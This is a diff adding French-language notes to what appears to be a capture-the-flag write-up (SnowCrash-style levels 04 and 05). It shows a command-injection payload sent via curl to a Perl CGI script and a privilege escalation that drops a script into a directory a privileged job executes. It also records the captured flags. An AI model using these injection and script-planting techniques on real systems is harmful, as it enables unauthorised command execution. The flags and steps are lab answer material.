@@ -172,9 +172,61 @@ export PATH=/tmp:$PATH
 
 flag: qi0maab88jeaj46qoumi7maus
 
+--------------
 
 level04
 
+j'ai cat le fichier Perl 
+
+j'ai vue
+```c
+print `echo $y 2>&1`;
+```
+ce que l'utilisateur envoie dans url , on le met apres un echo
+
+```c
+curl "http://localhost:4747/?x=\`getflag\`"
+```
+
+Ici, on remplace l’argument de echo par la sortie de getflag → donc c’est getflag qui est exécuté par Perl, et son résultat est imprimé.
 
 
+flag: ne2searoevaevoem4ov4ar8ap
 
+-----------
+
+level05
+
+```c
+find / -user flag05 2> /dev/null 
+/usr/sbin/openarenaserver
+/rofs/usr/sbin/openarenaserver
+```
+
+j'ai cat
+
+#!/bin/sh
+
+for i in /opt/openarenaserver/* ; do
+	(ulimit -t 5; bash -x "$i")
+	rm -f "$i"
+done
+
+il exécute n’importe quel script placé dans /opt/openarenaserver/.
+
+
+donc je vais executer mon getflag
+```c
+echo "getflag > /tmp/result_flag05" > /opt/openarenaserver/monscript.sh
+```
+
+puis je cat
+```c
+cat /tmp/result_flag05
+```
+
+flag: viuaaale9huek52boumoomioc
+
+-------------
+
+level06
